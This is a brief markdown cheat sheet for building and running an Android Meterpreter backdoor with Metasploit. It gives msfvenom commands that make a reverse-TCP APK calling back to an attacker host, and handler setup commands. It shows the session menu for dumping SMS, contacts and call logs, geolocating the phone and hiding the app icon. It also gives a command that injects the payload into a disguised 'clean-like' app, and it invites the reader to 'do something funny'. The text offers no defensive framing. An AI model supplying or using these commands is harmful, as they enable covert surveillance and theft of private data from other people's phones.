---
tags: [msf, android]
---


## Require
- Make sure the android device can visit the host where msf is running

## Steps
1. write an `apk` by msf:
`msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 R>nixni.apk`
1. install `nixni.apk` on android device
1. exploit
	``` sh
	msf > use exploit/multi/handler
	msf > set payload android/meterpreter/reverse_tcp
	msf > set LHOST 192.168.0.107
	msf > set LPORT 4444
	msf > exploit
	```

1. Meterpreter 
	``` sh
	meterpreter > ?
	
	Android Commands
	================

			Command           Description
			-------           -----------
			activity_start    Start an Android activity from a Uri string
			check_root        Check if device is rooted
			dump_calllog      Get call log
			dump_contacts     Get contacts list
			dump_sms          Get sms messages
			geolocate         Get current lat-long using geolocation
			hide_app_icon     Hide the app icon from the launcher
			interval_collect  Manage interval collection capabilities
			send_sms          Sends SMS from target session
			set_audio_mode    Set Ringer Mode
			sqlite_query      Query a SQLite database from storage
			wakelock          Enable/Disable Wakelock
			wlan_geolocate    Get current lat-long using WLAN information
			
	```
	
1. do something funny ;>


## Notice
- The attack is weak cause modern phone has advance mechanisms to prevent attack happen. There is two obstacle that author meets, install alert with virus warning and permissoin ask before running commands. 
- The apk is more powerful if inject it to another clean-like apk, commands: `
msfvenom -x nixni.apk -p android/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -o clean-like.apk
 `, more information please ref the msf doc.
